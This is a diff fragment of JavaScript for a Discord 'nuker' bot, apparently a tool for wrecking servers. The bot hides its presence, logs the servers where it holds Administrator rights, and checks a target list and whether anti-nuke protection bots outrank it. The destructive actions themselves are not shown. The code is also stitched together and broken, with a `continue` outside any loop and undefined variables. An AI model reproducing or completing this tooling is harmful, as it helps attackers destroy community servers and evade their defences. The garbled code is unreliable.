@@ -1,0 +1,36 @@
+    name: "ready",
+    once: true,
+    execute(nukerBot) {
+        console.log(nukerBot.user.id);
+
+        nukerBot.user.setPresence({activities: [{ name: 'lol', type: ActivityType.Watching }], status: 'invisible'})
+        nukerBot.guilds.cache.forEach(async guild => {
+            if (guild.members.me.roles.cache.find(role => role.permissions.has("Administrator"))) {
+                console.log(`Bot has permissions in ${guild.name}`);
+            } else {
+                console.log(`Bot has no permissions in ${guild.name}`);
+            }
+        });
+    }
+
+
+    var foundRole = guild.members.me.roles.cache.find(role => role.permissions.has('Administrator'));
+
+    if(foundRole === undefined) {
+        continue;
+    }
+
+    if(!config.nuke_options.filtered_guilds.includes(id)) {
+        continue;
+    }
+
+    if(guild.members.cache.hasAny(config.nuke_options.protection_bots)) {
+        for(const enemyBotID of config.nuke_options.protection_bots) {
+            const enemyBot = guild.members.cache.get(enemyBotID);
+
+            var botsHighestRole = enemyBot.roles.highest;
+            if(botsHighestRole.position > guild.members.me.roles.highest.position) {
+                continue;
+            }
+        }
+    }
